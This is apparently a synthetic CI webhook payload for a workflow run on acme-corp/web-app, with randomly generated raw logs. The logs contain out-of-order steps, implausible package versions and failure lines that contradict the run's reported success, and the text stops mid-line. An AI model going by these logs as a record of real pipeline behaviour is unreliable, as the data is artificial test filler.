{
  "action": "completed",
  "workflow_run": {
    "id": 887,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-888",
    "head_sha": "0535c1cc9932240cab5cb9fa7b9fc90de720ab3d",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-02T12:00:35.909324Z",
    "updated_at": "2025-12-02T12:02:58.550362Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: lint ===\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:35] INFO: Processing request\nCache hit for key-9259\nArtifact uploaded: build.tar.gz (39MB)\nStep 4/10: Building\nCache hit for key-6637\n  PASS: test_db_connect (103ms)\nArtifact uploaded: build.tar.gz (11MB)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_db_connect (232ms)\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\n[12:00:35] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 10/10: Building\n[12:00:35] INFO: Processing request\nCompiling src/index.js...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (35MB)\n  PASS: test_db_connect (277ms)\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_api_health (351ms)\nStep 1/10: Building\nInstalling prettier@3.2.0\nInstalling jest@4.3.0\nCompiling src/main.py...\nCache hit for key-9426\n  PASS: test_user_create (457ms)\nCache hit for key-6347\nStep 4/10: Building\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-7073\nStep 5/10: Building\n[12:00:35] INFO: Processing request\nStep 10/10: Building\n\u2713 test completed\nCompiling src/index.js...\nStep 8/10: Building\n  PASS: test_auth_login (477ms)\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (19MB)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (31MB)\nInstalling lodash@5.3.0\n  PASS: test_auth_login (425ms)\nInstalling react@1.0.0\nStep 1/10: Building\n\u2713 lint completed\n\u2713 test completed\nInstalling jest@2.3.0\n\u2717 build failed with exit code 41\nArtifact uploaded: build.tar.gz (25MB)\nInstalling jest@3.2.0\nCache hit for key-7591\nCache hit for key-9988\n  PASS: test_user_create (167ms)\nInstalling prettier@3.16.0\nStep 5/10: Building\n  PASS: test_auth_login (424ms)\n  PASS: test_auth_login (289ms)\n  PASS: test_db_connect (246ms)\nCache hit for key-9222\nCache hit for key-9373\n  PASS: test_auth_login (161ms)\n  PASS: test_api_health (262ms)\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-4968\n  PASS: test_user_create (3ms)\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nCache hit for key-3736\n[12:00:35] INFO: Processing request\nInstalling jest@2.14.0\nCache hit for key-6212\nInstalling prettier@5.19.0\nCompiling src/app.ts...\n\u2713 build completed\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_db_connect (137ms)\n\u2713 test completed\nCache hit for key-4234\n\u2713 test completed\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/handler.rs...\nCompiling src/utils.go...\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\n\u2717 build failed with exit code 20\n[12:00:35] INFO: Processing request\nCache hit for key-2888\n[12:00:35] INFO: Processing request\nInstalling eslint@2.7.0\n  PASS: test_cache_hit (353ms)\n[12:00:35] INFO: Processing request\n\u2713 test completed\n  PASS: test_api_health (337ms)\n\u2713 build completed\nStep 8/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\nCompiling src/service.java...\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling express@4.9.0\nStep 3/10: Building\n[12:00:35] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\nInstalling webpack@5.8.0\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nInstalling webpack@5.14.0\n  PASS: test_db_connect (287ms)\nException: ValueError\nStep 2/10: Building\nStep 7/10: Building\nInstalling axios@1.14.0\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (15MB)\nStep 10/10: Building\nCache hit for key-8870\nStep 7/10: Building\n  PASS: test_api_health (293ms)\n\u2713 build completed\nCache hit for key-4111\nCache hit for key-8946\n=== Step lint completed ===\n=== Step: build ===\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:35] INFO: Processing request\nCompiling src/handler.rs...\nStep 6/10: Building\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/app.ts...\nException: NullPointerException\nWARNING: eslint has known vulnerabilities\nCache hit for key-9528\n  PASS: test_api_health (493ms)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u2713 test completed\n  PASS: test_db_connect (453ms)\nArtifact uploaded: build.tar.gz (16MB)\nStep 4/10: Building\nCompiling src/utils.go...\nCache hit for key-9353\nCache hit for key-4976\n  PASS: test_auth_login (12ms)\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:35] INFO: Processing request\nCache hit for key-7553\nArtifact uploaded: build.tar.gz (28MB)\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_api_health (367ms)\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_db_connect (490ms)\n\u2713 lint completed\nCompiling src/index.js...\n  PASS: test_api_health (256ms)\nArtifact uploaded: build.tar.gz (35MB)\nCache hit for key-2163\n\u2713 test completed\nCache hit for key-9402\nArtifact uploaded: build.tar.gz (1MB)\nStep 3/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_cache_hit (35ms)\n  PASS: test_user_create (304ms)\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/utils.go...\nInstalling express@1.18.0\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (3MB)\nCache hit for key-2655\nInstalling eslint@5.19.0\nInstalling axios@2.6.0\nCache hit for key-8531\nCache hit for key-4513\nCompiling src/service.java...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (2MB)\nWARNING: axios has known vulnerabilities\nCache hit for key-5441\nWARNING: jest has known vulnerabilities\n[12:00:35] INFO: Processing request\nInstalling lodash@4.15.0\nCache hit for key-2364\n[12:00:35] INFO: Processing request\nCompiling src/index.js...\nCompiling src/app.ts...\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:35] INFO: Processing request\n\u2713 build completed\n\u2713 lint completed\nCompiling src/service.java...\nStep 5/10: Building\nStep 7/10: Building\n[12:00:35] WARN: Deprecated API usage\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (50MB)\nWARNING: react has known vulnerabilities\nInstalling prettier@1.3.0\nInstalling webpack@3.20.0\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (9MB)\nStep 5/10: Building\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (273ms)\n\u2713 build completed\nCompiling src/handler.rs...\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 test completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\nStep 7/10: Building\n\u2713 lint completed\nStep 2/10: Building\nCompiling src/handler.rs...\n\u2713 test completed\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (36MB)\nStep 7/10: Building\n\u2713 test completed\n\u2713 build completed\nInstalling lodash@5.3.0\nInstalling prettier@3.18.0\nStep 9/10: Building\nInstalling axios@5.12.0\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\nFAILED: test_api_health\nInstalling react@5.13.0\n\u2713 test completed\nInstalling express@4.12.0\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (359ms)\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 build completed\nCache hit for key-4942\nException: NullPointerException\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\nStep 9/10: Building\nCompiling src/app.ts...\nCache hit for key-7904\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:35] INFO: Processing request\n=== Step build completed ===\n=== Step: setup_node ===\nStep 10/10: Building\n\u2713 build completed\nCompiling src/main.py...\n\u2713 build completed\nCache hit for key-9398\nInstalling eslint@5.3.0\n  PASS: test_auth_login (6ms)\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/app.ts...\nCompiling src/service.java...\n  PASS: test_auth_login (200ms)\nStep 2/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nInstalling lodash@4.1.0\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\nWARNING: axios has known vulnerabilities\n  PASS: test_cache_hit (243ms)\n\u2717 build failed with exit code 37\nStep 9/10: Building\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (191ms)\n[12:00:35] INFO: Processing request\n\u2713 test completed\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:35] INFO: Processing request\nInstalling webpack@2.16.0\nCompiling src/main.py...\n\u2713 lint completed\n\u2713 build completed\nCompiling src/service.java...\n[12:00:35] WARN: Deprecated API usage\nCompiling src/main.py...\nCache hit for key-8395\nInstalling jest@3.10.0\n\u2713 test completed\n\u2717 build failed with exit code 6\n  PASS: test_user_create (359ms)\nStep 9/10: Building\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (15MB)\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:35] INFO: Processing request\n\u2713 test completed\n[12:00:35] INFO: Processing request\nStep 5/10: Building\n[12:00:35] WARN: Deprecated API usage\nInstalling prettier@2.10.0\nInstalling react@5.10.0\nCache hit for key-9891\n  PASS: test_cache_hit (132ms)\n\u2713 test completed\n[12:00:35] INFO: Processing request\n\u2713 build completed\nInstalling jest@1.4.0\n\u2713 build completed\nCompiling src/handler.rs...\n  PASS: test_cache_hit (21ms)\nCompiling src/index.js...\n\u2713 build completed\n\u2713 test completed\nStep 2/10: Building\nCompiling src/service.java...\nInstalling lodash@4.12.0\nCache hit for key-9848\n  PASS: test_user_create (241ms)\n  PASS: test_api_health (137ms)\nCache hit for key-5197\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-6126\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\n[12:00:35] INFO: Processing request\nInstalling axios@3.18.0\n  PASS: test_auth_login (91ms)\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (139ms)\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nInstalling axios@1.2.0\n[12:00:35] INFO: Processing request\nException: ValueError\nInstalling webpack@4.16.0\nInstalling prettier@4.1.0\nStep 2/10: Building\nCompiling src/service.java...\nCompiling src/app.ts...\n\u2713 build completed\nInstalling webpack@3.4.0\nCompiling src/utils.go...\n  PASS: test_api_health (327ms)\n  PASS: test_user_create (144ms)\nInstalling prettier@1.14.0\nInstalling prettier@2.7.0\nException: NullPointerException\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-4757\n[12:00:35] INFO: Processing request\nCache hit for key-8672\nArtifact uploaded: build.tar.gz (44MB)\nInstalling lodash@4.3.0\n[12:00:35] INFO: Processing request\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_api_health (9ms)\n  PASS: test_api_health (329ms)\nStep 3/10: Building\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-4434\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/index.js...\n\u2713 test completed\nStep 10/10: Building\nStep 10/10: Building\nStep 1/10: Building\nCache hit for key-8630\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/index.js...\nCache hit for key-6487\n\u2713 lint completed\nStep 6/10: Building\nCache hit for key-3373\nCache hit for key-1722\nCache hit for key-4739\n[12:00:35] INFO: Processing request\n=== Step setup_node completed ===\n=== Step: deploy_production ===\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 lint completed\n[12:00:35] INFO: Processing request\n  PASS: test_user_create (354ms)\nCache hit for key-5666\n\u2713 lint completed\nCache hit for key-7811\nArtifact uploaded: build.tar.gz (4MB)\nCompiling src/index.js...\nInstalling prettier@1.9.0\nInstalling lodash@5.11.0\n[12:00:35] INFO: Processing request\n\u2713 build completed\n  PASS: test_api_health (312ms)\n[12:00:35] WARN: Deprecated API usage\n\u2713 build completed\nInstalling lodash@1.20.0\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nInstalling lodash@2.15.0\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-3923\nStep 4/10: Building\n[12:00:35] INFO: Processing request\nStep 10/10: Building\nInstalling eslint@4.20.0\nStep 4/10: Building\nStep 8/10: Building\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-6256\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\n\u2713 build completed\nInstalling react@2.3.0\nArtifact uploaded: build.tar.gz (46MB)\nInstalling eslint@2.10.0\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: test_auth_login (341ms)\nCache hit for key-5924\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (49MB)\nInstalling jest@1.7.0\nCompiling src/main.py...\n  PASS: test_db_connect (19ms)\nInstalling react@5.7.0\nArtifact uploaded: build.tar.gz (4MB)\nStep 8/10: Building\n\u2713 build completed\nCache hit for key-4959\nInstalling prettier@1.16.0\nCompiling src/app.ts...\n\u2713 build completed\nCompiling src/main.py...\nCache hit for key-8519\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (71ms)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u2713 build completed\n[12:00:35] INFO: Processing request\nCache hit for key-1612\n\u2713 test completed\nCache hit for key-8388\n[12:00:35] INFO: Processing request\n\u2713 test completed\nWARNING: webpack has known vulnerabilities\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\nCompiling src/index.js...\nException: RuntimeError\nInstalling react@2.20.0\nInstalling react@3.13.0\n  PASS: test_cache_hit (364ms)\nCache hit for key-9501\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:35] ERROR: Connection failed\n\u2713 lint completed\n  PASS: test_user_create (366ms)\n[12:00:35] INFO: Processing request\nInstalling express@1.15.0\n\u2717 build failed with exit code 24\n  PASS: test_api_health (36ms)\n  PASS: test_cache_hit (414ms)\n  PASS: test_auth_login (193ms)\n\u2713 test completed\n  PASS: test_api_health (58ms)\nCache hit for key-9143\n  PASS: test_auth_login (30ms)\n\u2713 test completed\n  PASS: test_api_health (427ms)\nCache hit for key-5802\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (49MB)\nInstalling prettier@4.13.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (3MB)\nStep 4/10: Building\nStep 8/10: Building\n\u2713 lint completed\n\u2713 test completed\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nInstalling prettier@2.5.0\n[12:00:35] WARN: Deprecated API usage\nInstalling axios@2.4.0\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:35] INFO: Processing request\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nCompiling src/service.java...\n\u2713 build completed\n[12:00:35] INFO: Processing request\nCache hit for key-6338\nInstalling react@5.3.0\nCompiling src/app.ts...\n[12:00:35] ERROR: Connection failed\nCache hit for key-7279\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:35] INFO: Processing request\nInstalling prettier@5.20.0\n[12:00:35] INFO: Processing request\nInstalling react@1.10.0\nCache hit for key-2340\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 build completed\nCache hit for key-6219\n\u2713 lint completed\nCache hit for key-6753\n[12:00:35] INFO: Processing request\nCache hit for key-9208\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n=== Step deploy_production completed ===\n=== Step: integration_tests ===\nInstalling eslint@3.12.0\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\nInstalling jest@3.12.0\nStep 1/10: Building\n  PASS: test_cache_hit (77ms)\n  PASS: test_auth_login (176ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_cache_hit (5ms)\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_auth_login (36ms)\nInstalling axios@2.16.0\n\u2713 test completed\nCompiling src/app.ts...\nStep 4/10: Building\nCompiling src/handler.rs...\nCompiling src/app.ts...\nInstalling jest@2.18.0\nStep 6/10: Building\nCompiling src/app.ts...\n  PASS: test_api_health (385ms)\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (32MB)\nInstalling lodash@4.5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling eslint@5.1.0\nArtifact uploaded: build.tar.gz (38MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (33MB)\nInstalling react@2.15.0\n\u2713 test completed\nCompiling src/index.js...\nStep 9/10: Building\n  PASS: test_cache_hit (240ms)\nStep 8/10: Building\nCache hit for key-5708\n  PASS: test_db_connect (39ms)\nStep 9/10: Building\nCompiling src/utils.go...\nCompiling src/app.ts...\nInstalling prettier@3.4.0\n\u2713 build completed\n\u2713 test completed\nStep 2/10: Building\n\u2713 build completed\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2717 build failed with exit code 85\n  PASS: test_db_connect (183ms)\nStep 9/10: Building\nCache hit for key-6106\nInstalling webpack@3.13.0\n[12:00:35] INFO: Processing request\nCache hit for key-7884\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (253ms)\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 test completed\nCompiling src/handler.rs...\nCache hit for key-9186\nStep 2/10: Building\n[12:00:35] INFO: Processing request\nStep 1/10: Building\n  PASS: test_db_connect (347ms)\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/main.py...\nStep 6/10: Building\nInstalling react@4.18.0\nStep 4/10: Building\n\u2713 lint completed\n  PASS: test_db_connect (442ms)\nException: RuntimeError\n  PASS: test_api_health (447ms)\n\u2713 test completed\nInstalling react@4.16.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\nStep 10/10: Building\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:35] WARN: Deprecated API usage\nInstalling express@3.14.0\n[12:00:35] ERROR: Connection failed\nInstalling lodash@2.12.0\n\u2713 lint completed\n\u2713 lint completed\nInstalling axios@4.14.0\nArtifact uploaded: build.tar.gz (29MB)\nWARNING: lodash has known vulnerabilities\nCache hit for key-4979\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\n  PASS: test_api_health (328ms)\nInstalling jest@3.3.0\n\u2713 build completed\nInstalling react@5.5.0\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_db_connect (285ms)\nStep 3/10: Building\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nStep 1/10: Building\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_db_connect (350ms)\nWARNING: eslint has known vulnerabilities\nCompiling src/handler.rs...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (40MB)\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_db_connect (83ms)\nWARNING: jest has known vulnerabilities\n[12:00:35] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_db_connect (37ms)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-5272\nCache hit for key-6443\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (46MB)\nInstalling axios@4.19.0\n  PASS: test_user_create (97ms)\nInstalling axios@1.0.0\n\u2713 test completed\n\u2713 build completed\n=== Step integration_tests completed ===\n=== Step: checkout ===\nCompiling src/app.ts...\nInstalling eslint@4.2.0\n\u2713 test completed\nStep 3/10: Building\n\u2713 build completed\n  PASS: test_auth_login (192ms)\nCache hit for key-8469\n\u2713 build completed\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nWARNING: jest has known vulnerabilities\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-6101\nCompiling src/app.ts...\n  PASS: test_api_health (363ms)\n\u2713 build completed\n  PASS: test_cache_hit (73ms)\nCompiling src/index.js...\n[12:00:35] WARN: Deprecated API usage\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/utils.go...\nInstalling lodash@1.2.0\nStep 9/10: Building\nWARNING: webpack has known vulnerabilities\nWARNING: jest has known vulnerabilities\n[12:00:35] INFO: Processing request\n\u2713 build completed\nInstalling eslint@1.0.0\nCache hit for key-4850\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (55ms)\nArtifact uploaded: build.tar.gz (36MB)\nStep 3/10: Building\nCache hit for key-1686\n  PASS: test_user_create (198ms)\nStep 2/10: Building\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (38MB)\nStep 3/10: Building\nInstalling axios@3.17.0\n\u2713 lint completed\nInstalling prettier@1.20.0\n[12:00:35] INFO: Processing request\n\u2713 test completed\n  PASS: test_cache_hit (397ms)\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:35] INFO: Processing request\nInstalling axios@1.10.0\nCompiling src/handler.rs...\nInstalling jest@3.16.0\n[12:00:35] WARN: Deprecated API usage\nStep 10/10: Building\n[12:00:35] WARN: Deprecated API usage\nStep 4/10: Building\nCache hit for key-9327\nCompiling src/service.java...\n  PASS: test_user_create (342ms)\nCache hit for key-5400\nCache hit for key-9899\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (23MB)\nInstalling express@1.17.0\n  PASS: test_cache_hit (369ms)\nStep 6/10: Building\nInstalling prettier@4.8.0\nCache hit for key-1268\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/index.js...\n  PASS: test_auth_login (452ms)\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 6/10: Building\nCache hit for key-1128\nInstalling react@5.3.0\nStep 2/10: Building\nInstalling eslint@4.17.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/index.js...\nCache hit for key-5143\n\u2713 lint completed\nInstalling express@2.20.0\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:35] INFO: Processing request\nStep 5/10: Building\n  PASS: test_auth_login (146ms)\nStep 6/10: Building\n  PASS: test_cache_hit (492ms)\nWARNING: eslint has known vulnerabilities\nCompiling src/app.ts...\nFAILED: test_cache_hit\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\n[12:00:35] INFO: Processing request\nCache hit for key-2680\n  PASS: test_auth_login (327ms)\nInstalling react@2.2.0\n[12:00:35] INFO: Processing request\nCache hit for key-3659\nCache hit for key-3084\nCompiling src/main.py...\nInstalling lodash@3.8.0\nInstalling axios@1.14.0\n  PASS: test_user_create (2ms)\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_cache_hit (413ms)\n  PASS: test_cache_hit (488ms)\n  PASS: test_api_health (337ms)\n[12:00:35] INFO: Processing request\nStep 6/10: Building\n[12:00:35] INFO: Processing request\nCache hit for key-3656\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (89ms)\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_auth_login (391ms)\n  PASS: test_user_create (444ms)\nCache hit for key-8467\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nCache hit for key-8346\n  PASS: test_cache_hit (88ms)\n  PASS: test_api_health (125ms)\n  PASS: test_api_health (150ms)\n=== Step checkout completed ===\n=== Step: setup_environment ===\nCache hit for key-5327\nCache hit for key-5445\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 test completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-1356\n\u2713 test completed\nArtifact uploaded: build.tar.gz (15MB)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:35] INFO: Processing request\nStep 7/10: Building\nStep 8/10: Building\nCompiling src/service.java...\n  PASS: test_cache_hit (266ms)\nArtifact uploaded: build.tar.gz (41MB)\n[12:00:35] WARN: Deprecated API usage\n\u2713 build completed\nStep 7/10: Building\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-3623\nWARNING: webpack has known vulnerabilities\nCompiling src/service.java...\nInstalling express@4.6.0\nInstalling jest@1.9.0\nArtifact uploaded: build.tar.gz (18MB)\nStep 5/10: Building\n\u2713 test completed\nStep 9/10: Building\nCache hit for key-3122\n  PASS: test_db_connect (333ms)\nInstalling express@4.17.0\nWARNING: react has known vulnerabilities\nInstalling react@3.20.0\nStep 6/10: Building\nStep 1/10: Building\nStep 7/10: Building\n  PASS: test_api_health (322ms)\nCache hit for key-4110\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (218ms)\n  PASS: test_db_connect (46ms)\nCache hit for key-5084\nStep 9/10: Building\nStep 7/10: Building\nInstalling lodash@4.9.0\n\u2713 build completed\n[12:00:35] INFO: Processing request\nStep 9/10: Building\nStep 5/10: Building\nCompiling src/index.js...\nInstalling react@5.18.0\nCompiling src/service.java...\nInstalling eslint@4.2.0\n[12:00:35] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\nStep 3/10: Building\nStep 4/10: Building\nCompiling src/handler.rs...\n  PASS: test_user_create (184ms)\nCache hit for key-9223\n  PASS: test_api_health (189ms)\n  PASS: test_auth_login (202ms)\n  PASS: test_auth_login (40ms)\nCache hit for key-7470\n\u2713 test completed\nCache hit for key-2660\nCache hit for key-8329\nInstalling lodash@5.2.0\nInstalling axios@5.10.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (25MB)\nStep 2/10: Building\nStep 10/10: Building\nCache hit for key-5508\nStep 2/10: Building\nInstalling react@3.14.0\nArtifact uploaded: build.tar.gz (18MB)\nStep 7/10: Building\n\u2713 build completed\nInstalling jest@1.1.0\n[12:00:35] WARN: Deprecated API usage\nInstalling react@2.0.0\nArtifact uploaded: build.tar.gz (20MB)\nCompiling src/service.java...\nStep 4/10: Building\n  PASS: test_api_health (373ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 6/10: Building\nStep 2/10: Building\n[12:00:35] INFO: Processing request\nStep 9/10: Building\n  PASS: test_user_create (417ms)\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nCache hit for key-5851\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-1116\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_api_health (321ms)\nCompiling src/handler.rs...\nCache hit for key-3604\nCache hit for key-5572\n\u2713 build completed\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/main.py...\nCache hit for key-6543\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\nCompiling src/index.js...\nCompiling src/main.py...\n[12:00:35] ERROR: Connection failed\n\u2713 lint completed\n\u2713 build completed\nCompiling src/app.ts...\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_api_health (232ms)\n  PASS: test_api_health (210ms)\nCache hit for key-5492\n[12:00:35] INFO: Processing request\nCompiling 